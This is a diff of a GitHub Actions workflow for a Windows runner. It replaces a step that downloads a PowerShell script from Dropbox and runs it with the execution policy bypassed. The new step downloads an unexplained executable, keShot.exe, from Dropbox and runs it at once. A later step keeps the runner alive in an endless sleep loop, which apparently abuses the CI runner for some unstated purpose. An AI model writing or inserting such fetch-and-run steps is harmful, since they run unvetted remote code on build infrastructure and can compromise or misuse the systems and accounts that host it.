@@ -6,18 +6,13 @@ on:
 jobs:
   run-windows:
     runs-on: windows-latest
-    timeout-minutes: 60
+    timeout-minutes: 30
 
     steps:
-      - name: Download external Setup.ps1
-        shell: powershell
+      - name: Downloading & Installing Essentials
         run: |
-          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/kvc0lcibrk68g7j8azu83/Setup.ps1?rlkey=oawv04248xvf9lnaebhjeeaa3&st=kca9y2of&raw=1" -OutFile "Setup.ps1"
-
-      - name: Run external Setup.ps1
-        shell: powershell
-        run: |
-          powershell -ExecutionPolicy Bypass -File "./Setup.ps1"
+          Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/rud4p7whifvqjncwtteea/keShot.exe?rlkey=k38ehbypdhtbgvn29hwepaq67&st=p9ci398c&raw=1" -OutFile "keShot.exe"
+          cmd /c keShot.exe
 
       - name: Run programs and keep session alive
         shell: powershell
@@ -29,3 +24,4 @@ jobs:
           while ($true) {
             Start-Sleep -Seconds 10
           }
+
